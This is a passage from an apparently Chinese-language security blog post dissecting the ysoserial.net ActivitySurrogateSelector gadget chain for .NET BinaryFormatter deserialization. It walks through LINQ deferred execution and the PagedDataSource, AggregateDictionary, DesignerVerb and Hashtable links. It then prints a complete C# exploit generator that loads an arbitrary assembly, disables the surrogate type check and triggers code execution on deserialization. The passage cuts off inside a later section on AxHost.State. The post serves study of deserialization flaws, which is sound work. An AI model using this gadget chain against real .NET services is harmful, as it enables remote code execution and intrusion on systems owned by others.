class="title">ObjectSerializedRef</span> : <span class="title">IObjectReference</span>, <span class="title">IDeserializationCallback</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">private</span> Type type;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">object</span>[] memberDatas;</span><br><span class="line">        [<span class="meta">NonSerialized</span>]</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">object</span> returnedObject;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">object</span> IObjectReference.GetRealObject(StreamingContext context)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck &amp;&amp; !<span class="keyword">typeof</span> (ActivityBind).IsAssignableFrom(<span class="keyword">this</span>.type) &amp;&amp; !<span class="keyword">typeof</span> (DependencyObject).IsAssignableFrom(<span class="keyword">this</span>.type))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="keyword">nameof</span> (context));</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">this</span>.returnedObject = FormatterServices.GetUninitializedObject(<span class="keyword">this</span>.type);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">this</span>.returnedObject;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">void</span> IDeserializationCallback.OnDeserialization(<span class="built_in">object</span> sender)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          <span class="keyword">if</span> (!AppSettings.DisableActivitySurrogateSelectorTypeCheck &amp;&amp; !<span class="keyword">typeof</span> (ActivityBind).IsAssignableFrom(<span class="keyword">this</span>.type) &amp;&amp; !<span class="keyword">typeof</span> (DependencyObject).IsAssignableFrom(<span class="keyword">this</span>.type) &amp;&amp; !(<span class="keyword">this</span>.returnedObject <span class="keyword">is</span> ActivityBind) &amp;&amp; !(<span class="keyword">this</span>.returnedObject <span class="keyword">is</span> DependencyObject))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">          <span class="built_in">string</span>[] names = (<span class="built_in">string</span>[]) <span class="literal">null</span>;</span><br><span class="line">          FormatterServices.PopulateObjectMembers(<span class="keyword">this</span>.returnedObject, FormatterServicesNoSerializableCheck.GetSerializableMembers(<span class="keyword">this</span>.type, <span class="keyword">out</span> names), <span class="keyword">this</span>.memberDatas);</span><br><span class="line">          <span class="keyword">this</span>.returnedObject = (<span class="built_in">object</span>) <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>它是一个可序列化的类，也就是说我们可以序列化并且反序列化一个本不可反序列化的类。所以说为啥和Hessian很像，那么既然如此，攻击面就可以扩大化了。</p>
<h2 id="0-3-1-LINQ"><a href="#0-3-1-LINQ" class="headerlink" title="0-3.1 LINQ"></a>0-3.1 LINQ</h2><p>什么是LINQ呢，LINQ是C#中一种类sql的查询语法。就简单的举个例子</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> word = <span class="string">&quot;hello from linq.&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> words = word.Split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> q1 = <span class="keyword">from</span> s <span class="keyword">in</span> words</span><br><span class="line">        <span class="keyword">where</span> s.ToLower().Contains(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">        <span class="keyword">select</span> s;</span><br><span class="line">    Console.WriteLine(q1);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> q1)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(item);</span><br><span class="line">    &#125;</span><br><span class="line">    Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.Linq.Enumerable+WhereArrayIterator`1[System.String]</span><br><span class="line">hello</span><br><span class="line">from</span><br></pre></td></tr></table></figure>
<p>他会返回一个Enumerable迭代对象当做查询结果。并且LINQ有一个特性叫做延迟执行，也就是说当语句执行到<br><code> var q1 = from s in words where s.ToLower().Contains(&#39;o&#39;) select s;</code><br>这一步的时候，它并不会执行select语句，它需要被当做enumerable对象的时候会自动触发，也就是上述demo中的<code>foreach (var item in q1)</code><br>结合上面说的攻击面扩大，我们可以反序列化LINQ对象进行命令执行，基本的触发链如下</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        List&lt;<span class="built_in">byte</span>[]&gt; data = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>[]&gt;();</span><br><span class="line">        data.Add(File.ReadAllBytes(<span class="string">&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;</span>));</span><br><span class="line">        <span class="keyword">var</span> e1 = data.Select(Assembly.Load);</span><br><span class="line">        Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(<span class="keyword">typeof</span>(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), <span class="keyword">typeof</span>(Assembly).GetMethod(<span class="string">&quot;GetTypes&quot;</span>));</span><br><span class="line">        <span class="keyword">var</span> e2 = e1.SelectMany(map_type);</span><br><span class="line">        <span class="keyword">var</span> e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">var</span> o <span class="keyword">in</span> e3)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>他其实和Chaintransformer是一样的，一个链式调用，最终执行到CreateInstance里面实例化任意类，至于那个委托是因为方法需要反射获取。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708943897905-58cb67af-68fd-4982-99b0-d2185f309a63.png#averageHue=%232c2b2a&clientId=ud5d48222-4356-4&from=paste&height=581&id=u8cabb54d&originHeight=726&originWidth=1715&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=192138&status=done&style=none&taskId=ub2b558bc-7e03-44bf-be80-c2b4e0b7d11&title=&width=1372" alt="image.png"></p>
<h2 id="0-3-2-调用链"><a href="#0-3-2-调用链" class="headerlink" title="0-3.2 调用链"></a>0-3.2 调用链</h2><p>ysoserial.net找到的调用链如下</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEnumerable -&gt; PagedDataSource -&gt; ICollection</span><br><span class="line">ICollection -&gt; AggregateDictionary -&gt; IDictionary</span><br><span class="line">IDictionary -&gt; DesignerVerb -&gt; ToString</span><br></pre></td></tr></table></figure>
<p>最终是要到IEnumberable触发。我们一点点往上看<br>PagedDataSource<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708944071261-6ee026e4-9d2f-45e9-8ff1-d1981b2df242.png#averageHue=%23212020&clientId=ud5d48222-4356-4&from=paste&height=499&id=uc6f2e87e&originHeight=624&originWidth=1504&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80286&status=done&style=none&taskId=u9f7bf920-7455-4ef2-9fbc-2ab618330b5&title=&width=1203.2" alt="image.png"><br>其中属性dataSource是IEnumerable类型，因此可以承接上终点的LINQ，又因为PagedDataSource是ICollection的子类，因此可以往上强转，最终到了<code>AggregateDictionary</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708944338214-3c96a652-f89d-4477-b1d6-b253bd6e9a2d.png#averageHue=%23232120&clientId=ud5d48222-4356-4&from=paste&height=536&id=u1e048ada&originHeight=670&originWidth=1394&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120289&status=done&style=none&taskId=u55b3b8d7-ba5d-4bc8-85ae-cda1a9c576f&title=&width=1115.2" alt="image.png"><br>这里触发了Enumberable，并且可以看到它的构造方法传入了Icollection对象，我们把上面说到的PagedDataSource放进去就好了。<br><code>AggregateDictionary</code>继承IDictionary，因此继续往上看。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DesignerVerb</span> : <span class="title">MenuCommand</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DesignerVerb</span>(<span class="params"><span class="built_in">string</span> text, EventHandler handler</span>)</span></span><br><span class="line"><span class="function">      : <span class="title">base</span>(<span class="params">handler, StandardCommands.VerbFirst</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Text)] = text == <span class="literal">null</span> ? (<span class="built_in">object</span>) (<span class="built_in">string</span>) <span class="literal">null</span> : (<span class="built_in">object</span>) Regex.Replace(text, <span class="string">&quot;\\(\\&amp;.\\)&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DesignerVerb</span>(<span class="params"><span class="built_in">string</span> text, EventHandler handler, CommandID startCommandID</span>)</span></span><br><span class="line"><span class="function">      : <span class="title">base</span>(<span class="params">handler, startCommandID</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Text)] = text == <span class="literal">null</span> ? (<span class="built_in">object</span>) (<span class="built_in">string</span>) <span class="literal">null</span> : (<span class="built_in">object</span>) Regex.Replace(text, <span class="string">&quot;\\(\\&amp;.\\)&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Description</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">get</span> =&gt; (<span class="built_in">string</span>) <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Description)] ?? <span class="built_in">string</span>.Empty;</span><br><span class="line">      <span class="keyword">set</span> =&gt; <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Description)] = (<span class="built_in">object</span>) <span class="keyword">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Text =&gt; (<span class="built_in">string</span>) <span class="keyword">this</span>.Properties[(<span class="built_in">object</span>) <span class="keyword">nameof</span> (Text)] ?? <span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">ToString</span>()</span> =&gt; <span class="keyword">this</span>.Text + <span class="string">&quot; : &quot;</span> + <span class="keyword">base</span>.ToString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里把一些重点方法拿出来了。可以看到ToString的地方配合上Text字段的getter方法可以接上<code>AggregateDictionary</code>，我们只需要将properties设置为<code>AggregateDictionary</code>即可。因此最终来到了如何触发ToString方法上，这里Ysoserial中使用的是HashTable。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708944687221-85dc675f-768d-4db5-af0c-57f5f2775f42.png#averageHue=%2321201f&clientId=ud5d48222-4356-4&from=paste&height=304&id=u96d91796&originHeight=380&originWidth=1483&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88267&status=done&style=none&taskId=ucc1d493c-a941-42b1-8599-67c1883e0c8&title=&width=1186.4" alt="image.png"><br>Hashtable在反序列化的时候会重新建key集合。引发异常的话就会触发ToString，如图，如果2个键相同就会引发异常。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel.Design;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI.WebControls;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Soap;</span><br><span class="line"><span class="keyword">using</span> NDesk.Options;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ysoserial.Generators</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MySurrogateSelector</span> : <span class="title">SurrogateSelector</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PayloadClass</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">byte</span>[] assemblyBytes;</span><br><span class="line">        <span class="keyword">protected</span> <span class="built_in">int</span> variant_number = <span class="number">1</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PayloadClass</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.assemblyBytes = File.ReadAllBytes(<span class="string">&quot;E:\\CTFLearning\\开发学习\\CsharpLearning\\ExpClassa\\ExpClassa\\obj\\Debug\\ExpClassa.dll&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">IEnumerable</span>&lt;<span class="title">TResult</span>&gt; <span class="title">CreateWhereSelectEnumerableIterator</span>&lt;<span class="title">TSource</span>, <span class="title">TResult</span>&gt;(<span class="params">IEnumerable&lt;TSource&gt; src, Func&lt;TSource, <span class="built_in">bool</span>&gt; predicate, Func&lt;TSource, TResult&gt; selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type t = Assembly.Load(<span class="string">&quot;System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>)</span><br><span class="line">              .GetType(<span class="string">&quot;System.Linq.Enumerable+WhereSelectEnumerableIterator`2&quot;</span>)</span><br><span class="line">              .MakeGenericType(<span class="keyword">typeof</span>(TSource), <span class="keyword">typeof</span>(TResult));</span><br><span class="line">            <span class="keyword">return</span> t.GetConstructors()[<span class="number">0</span>].Invoke(<span class="keyword">new</span> <span class="built_in">object</span>[] &#123; src, predicate, selector &#125;) <span class="keyword">as</span> IEnumerable&lt;TResult&gt;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">PayloadClass</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">object</span>&gt; <span class="title">GadgetChains</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            DesignerVerb verb = <span class="literal">null</span>;</span><br><span class="line">            Hashtable ht = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = <span class="literal">null</span>;</span><br><span class="line">            List&lt;<span class="built_in">byte</span>[]&gt; data = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>[]&gt;();</span><br><span class="line">            data.Add(<span class="keyword">this</span>.assemblyBytes);</span><br><span class="line">            <span class="keyword">var</span> e1 = data.Select(Assembly.Load);</span><br><span class="line">            Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt; map_type = (Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;)Delegate.CreateDelegate(<span class="keyword">typeof</span>(Func&lt;Assembly, IEnumerable&lt;Type&gt;&gt;), <span class="keyword">typeof</span>(Assembly).GetMethod(<span class="string">&quot;GetTypes&quot;</span>));</span><br><span class="line">            <span class="keyword">var</span> e2 = e1.SelectMany(map_type);</span><br><span class="line">            <span class="keyword">var</span> e3 = e2.Select(Activator.CreateInstance);</span><br><span class="line">            PagedDataSource pds = <span class="keyword">new</span> PagedDataSource() &#123; DataSource = e3 &#125;;</span><br><span class="line">            IDictionary dict = (IDictionary)Activator.CreateInstance(<span class="keyword">typeof</span>(<span class="built_in">int</span>).Assembly.GetType(<span class="string">&quot;System.Runtime.Remoting.Channels.AggregateDictionary&quot;</span>), pds);</span><br><span class="line">            verb = <span class="keyword">new</span> DesignerVerb(<span class="string">&quot;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">typeof</span>(MenuCommand).GetField(<span class="string">&quot;properties&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);</span><br><span class="line">            ls = <span class="keyword">new</span> List&lt;<span class="built_in">object</span>&gt;();</span><br><span class="line">            ls.Add(e1);</span><br><span class="line">            ls.Add(e2);</span><br><span class="line">            ls.Add(e3);</span><br><span class="line">            ls.Add(pds);</span><br><span class="line">            ls.Add(verb);</span><br><span class="line">            ls.Add(dict);</span><br><span class="line">            ht = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            ht.Add(verb, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            ht.Add(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            FieldInfo fi_keys = ht.GetType().GetField(<span class="string">&quot;buckets&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line">            Array keys = (Array)fi_keys.GetValue(ht);</span><br><span class="line">            FieldInfo fi_key = keys.GetType().GetElementType().GetField(<span class="string">&quot;key&quot;</span>, BindingFlags.Public | BindingFlags.Instance);</span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; keys.Length; ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">object</span> bucket = keys.GetValue(i);</span><br><span class="line">                <span class="built_in">object</span> key = fi_key.GetValue(bucket);</span><br><span class="line">                <span class="keyword">if</span> (key <span class="keyword">is</span> <span class="built_in">string</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    fi_key.SetValue(bucket, verb);</span><br><span class="line">                    keys.SetValue(bucket, i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            fi_keys.SetValue(ht, keys);</span><br><span class="line"></span><br><span class="line">            ls.Add(ht);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ls;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">byte</span>[] <span class="title">GadgetChainsToBinaryFormatter</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            List&lt;<span class="built_in">object</span>&gt; ls = GadgetChains();</span><br><span class="line">            MemoryStream stm = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = <span class="keyword">new</span> System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();</span><br><span class="line">            fmt.SurrogateSelector = <span class="keyword">new</span> MySurrogateSelector();</span><br><span class="line">            fmt.Serialize(stm, ls);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> stm.ToArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Trace.WriteLine(<span class="string">&quot;In GetObjectData&quot;</span>);</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Windows.Forms.AxHost.State));</span><br><span class="line">            info.AddValue(<span class="string">&quot;PropertyBagBinary&quot;</span>, GadgetChainsToBinaryFormatter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Exp</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Configuration.ConfigurationManager.AppSettings.Set(<span class="string">&quot;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">            PayloadClass payload = <span class="keyword">new</span> PayloadClass();</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream(payload.GadgetChainsToBinaryFormatter()))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 构建formatter</span></span><br><span class="line">                <span class="comment">// SoapFormatter sp1 = new SoapFormatter();</span></span><br><span class="line">                <span class="comment">// sp1.Serialize(memoryStream, payload);</span></span><br><span class="line">                memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                <span class="comment">// var sp2=new SoapFormatter();</span></span><br><span class="line">                <span class="keyword">var</span> bn=<span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                bn.Deserialize(memoryStream);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1708950187517-0d9b52cf-ed25-4e7e-8dcd-23ef40212229.png#averageHue=%23659c77&clientId=u9e1fcbc0-b876-4&from=paste&height=778&id=u947297b5&originHeight=972&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=258963&status=done&style=none&taskId=ue3c4a23f-63ea-466e-9b3c-3169a575f3e&title=&width=1530.4" alt="image.png"><br>虽然也可以弹窗，但是这个payload会报错，在实战中可能会导致利用失败，为了避免这种情况，ysoserial选择了一种二次反序列化的做法。</p>
<h2 id="0-3-3-AxHost-State"><a href="#0-3-3-AxHost-State" class="headerlink" title="0-3.3 AxHost.State"></a>0-3.3 AxHost.State</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">State</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">        SerializationInfoEnumerator enumerator = info.GetEnumerator();</span><br><span class="line">        <span class="keyword">if</span> 